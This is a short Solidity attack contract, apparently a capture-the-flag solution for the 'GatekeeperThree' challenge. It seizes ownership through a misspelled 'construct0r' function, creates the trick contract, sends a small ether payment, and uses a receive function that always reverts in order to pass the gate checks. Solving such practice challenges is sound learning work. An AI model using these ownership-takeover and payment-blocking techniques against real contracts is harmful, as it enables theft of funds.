// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {GatekeeperThree, SimpleTrick} from "../src/GatekeeperThree.sol";

contract GatekeeperThreeAttack {
    GatekeeperThree public gatekeeperThree;
    SimpleTrick public trick;

    constructor(address payable _gatekeeperThreeAddress) {
        gatekeeperThree = GatekeeperThree(_gatekeeperThreeAddress);
    }

    function attack() public payable {
        gatekeeperThree.construct0r();
        gatekeeperThree.createTrick();
        (bool success, ) = address(gatekeeperThree).call{value: 0.0011 ether}(
            ""
        );
        require(success, "Failed to send ETH");
    }

    function enter() public {
        gatekeeperThree.enter();
    }

    receive() external payable {
        revert();
    }
}
